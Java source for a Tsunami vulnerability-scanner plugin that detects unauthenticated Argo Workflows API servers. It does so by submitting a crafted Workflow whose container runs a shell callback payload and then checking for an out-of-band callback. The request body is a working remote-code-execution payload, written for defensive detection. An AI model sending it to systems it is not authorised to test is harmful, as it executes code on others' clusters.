/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.tsunami.plugins.detectors.exposedui.argoworkflows;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.gson.JsonSyntaxException;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.data.NetworkEndpointUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.NotImplementedException;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.plugins.detectors.exposedui.argoworkflows.Annotations.OobSleepDuration;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects exposed ArgoWorkflows API server. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,

    // name of the plugin
    name = "ExposedArgoWorkflowsDetector",
    version = "0.1",

    // detailed description of the plugin
    description =
        "This plugin detects exposed and misconfigured ArgoWorkflows API server."
            + "Exposed Argo Workflows API servers allow attackers to access kubernetes clusters."
            + "Attackers can change parameters of clusters and possibly compromise it.",
    author = "JamesFoxxx",
    bootstrapModule = ExposedArgoWorkflowsDetectorBootstrapModule.class)
public final class ExposedArgoWorkflowsDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final PayloadGenerator payloadGenerator;
  private final Clock utcClock;
  private final HttpClient httpClient;
  private final int oobSleepDuration;

  @Inject
  ExposedArgoWorkflowsDetector(
      HttpClient httpClient,
      @UtcClock Clock utcClock,
      PayloadGenerator payloadGenerator,
      @OobSleepDuration int oobSleepDuration) {
    this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(true).build();
    this.utcClock = checkNotNull(utcClock);
    this.payloadGenerator = checkNotNull(payloadGenerator);
    this.oobSleepDuration = oobSleepDuration;
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log(
        "Starting exposed Argo Workflows API servers detection by out-of-band callback.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isArgoWorkflows)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUrl = NetworkEndpointUtils.toUriAuthority(networkService.getNetworkEndpoint());
    Payload callbackPayload = getTsunamiCallbackHttpPayload();
    if (callbackPayload == null
        || !callbackPayload.getPayloadAttributes().getUsesCallbackServer()) {
      logger.atWarning().log(
          "The Tsunami callback server is not setup for this environment,"
              + " so we cannot confirm the RCE callback");
      return false;
    }
    String defaultWorkflowUrl = targetUrl + "api/v1/workflows/default";
    try {
      HttpResponse response =
          httpClient.send(
              post(defaultWorkflowUrl)
                  .setHeaders(
                      HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
                  .setRequestBody(
                      ByteString.copyFromUtf8(
                          String.format(
                              "{\"workflow\":{\"apiVersion\":\"argoproj.io/v1alpha1\","
                                  + "\"kind\":\"Workflow\",\"metadata\":{\"name\":\"\","
                                  + "\"generateName\":\"scripts-\"}"
                                  + ",\"spec\":{\"destination\":{\"name\":\"\""
                                  + ",\"namespace\":\"\",\"server\":\"\"},"
                                  + "\"source\":{\"path\":\"\",\"repoURL\":\"\","
                                  + "\"targetRevision\":\"HEAD\"},\"project\":\"\","
                                  + "\"entrypoint\":\"aaaaaa\","
                                  + "\"templates\":[{\"name\":\"aaaaaa\","
                                  + "\"script\":{\"image\":\"curlimages/curl:7.78.0\""
                                  + ",\"command\":[\"sh\"],\"source\":\"%s\"}}]}}}",
                              callbackPayload.getPayload())))
                  .build(),
              networkService);
      if (response.status() != HttpStatus.OK) {
        return false;
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUrl);
    }

    Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(oobSleepDuration));
    if (callbackPayload.checkIfExecuted()) {
      logger.atInfo().log("Confirmed OOB Payload execution.");
      return true;
    }
    return false;
  }

  private boolean isArgoWorkflows(NetworkService networkService) {
    logger.atInfo().log("Starting exposed Argo Workflows servers detection by response matching.");
    String targetUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);

    String targetUri = targetUrl + "api/v1/workflows/";
    try {
      // This is a blocking call.
      HttpResponse response =
          httpClient.send(get(targetUri).withEmptyHeaders().build(), networkService);
      return response.status().isSuccess()
          && response.bodyString().isPresent()
          && response.bodyString().get().contains("\"items\"")
          && response.bodyString().get().contains("\"metadata\"");
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
      return false;
    } catch (JsonSyntaxException e) {
      logger.atWarning().withCause(e).log(
          "JSON syntax error occurred parsing response for target URI: '%s'.", targetUri);
      return false;
    }
  }

  private Payload getTsunamiCallbackHttpPayload() {
    try {
      return this.payloadGenerator.generate(
          PayloadGeneratorConfig.newBuilder()
              .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
              .setInterpretationEnvironment(
                  PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
              .setExecutionEnvironment(
                  PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
              .build());
    } catch (NotImplementedException n) {
      return null;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("ARGOWORKFLOWS_SERVER_EXPOSED"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Argo Workflows server Exposed")
                .setDescription(
                    "Argo Workflows server is misconfigured. The server is not"
                        + " authenticated. All workflows can be accessed by the public"
                        + " and therefore can be modified resulting in all workflows"
                        + " instances being compromised. The Argo Workflows UI does not support"
                        + " executing OS commands in the hosting machine at this time. We"
                        + " detected this vulnerable Argo Workflows server by creating a test"
                        + " workflow and receiving out-of-band callback")
                .setRecommendation("Please disable public access to your Argo Workflows server."))
        .build();
  }
}
